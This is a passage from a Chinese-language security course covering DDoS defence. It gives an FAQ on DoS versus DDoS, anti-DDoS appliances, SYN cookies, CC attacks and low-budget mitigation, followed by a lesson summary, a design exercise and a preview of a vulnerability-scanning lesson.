A: DoS是单机攻击，DDoS是分布式（多台机器同时）攻击。现代攻击几乎都是DDoS。用洪水比喻：DoS是一个人拿水管滋你，DDoS是一万个人同时拿水管滋你。

**Q2: 买了ADS就能完全免疫DDoS吗？**
A: 不能。安全是相对的。ADS能防住绝大多数攻击，但如果攻击流量超过你的总带宽，任何设备都无能为力——水管太细，再多过滤器也没用。这就是为什么大流量攻击需要运营商上游配合。

**Q3: SYN Cookie有什么缺点吗？**
A: 有。SYN Cookie会丢失TCP选项（如窗口缩放、SACK等），对高性能场景可能有性能影响。但现在的主流实现已经解决了大部分问题。

**Q4: 怎么区分正常流量激增和DDoS攻击？**
A: 关键看几个维度：1)来源IP分布是否正常；2)请求模式是否和正常用户一致；3)是否有业务事件（促销、热点新闻）对应。这就是ADS基线学习的重要性。

**Q5: 中小企业没有预算买ADS怎么办？**
A: 可以使用开源方案组合：iptables + ModSecurity + FastNetMon + Cloudflare免费CDN。虽然效果不如专业ADS，但对中小规模攻击够用。

**Q6: CC攻击为什么难防？**
A: 因为CC攻击的每个请求都是合法的HTTP请求，看起来就像真实用户。防御需要在应用层做行为分析——真实用户会浏览多个页面、停留、点击，而CC脚本只是机械地重复请求。

---

## 十二、今日总结

### 核心收获

| 知识点 | 一句话总结 |
|--------|-----------|
| DDoS分类 | 网络层(L3/L4)洪水型 vs 应用层(L7)CC型 |
| ADS架构 | 检测(发现)→清洗(过滤)→溯源(追踪) |
| 三种部署 | 串联(简单但瓶颈) / 旁路(复杂但强大) / 混合(最优但贵) |
| 核心防御技术 | SYN Cookie、BGP引流、速率限制、JS挑战 |
| 分层防护 | L3/L4粗筛 → L7精筛 → 正常用户放行 |

### 思考题

> 假设你是一家电商公司的安全工程师，双十一期间遭受了混合DDoS攻击（SYN Flood + CC），峰值流量达到50Gbps，而你的出口带宽只有10Gbps。你会如何设计防护方案？请画出架构图并说明各层防护策略。

---

> **明日预告**：DAY 27 · 绿盟RSAS漏洞扫描器——漏洞管理实战。我们将学习如何像黑客一样扫描自己的系统，在攻击者发现漏洞之前修复它们。准备好Docker，我们要部署OpenVAS了！
